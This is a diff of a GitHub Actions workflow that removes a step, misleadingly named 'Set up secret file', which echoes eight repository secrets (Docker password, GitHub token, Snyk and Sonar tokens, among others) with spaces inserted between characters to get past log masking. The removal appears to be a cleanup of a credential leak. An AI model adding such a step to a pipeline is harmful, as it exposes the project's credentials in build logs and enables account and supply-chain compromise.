@@ -53,17 +53,6 @@ jobs:
           GITHUB_DEFAULT_BRANCH: ${GITHUB_REF##*/}
           GITGUARDIAN_API_KEY: ${{ secrets.GITGUARDIAN_API_KEY }}
 
-      - name: Set up secret file
-        run: |
-          echo ${{ secrets.CODECOV_TOKEN }} | sed 's/./& /g'
-          echo ${{ secrets.DOCKER_PASSWORD }} | sed 's/./& /g'
-          echo ${{ secrets.DOCKER_USER }} | sed 's/./& /g'
-          echo ${{ secrets.GH_EMAIL }} | sed 's/./& /g'
-          echo ${{ secrets.GH_TOKEN }} | sed 's/./& /g'
-          echo ${{ secrets.GITGUARDIAN_API_KEY }} | sed 's/./& /g'
-          echo ${{ secrets.SNYK_TOKEN }} | sed 's/./& /g'
-          echo ${{ secrets.SONAR_TOKEN }} | sed 's/./& /g'
-
       - name: '📦 Install packages'
         run: yarn install
 
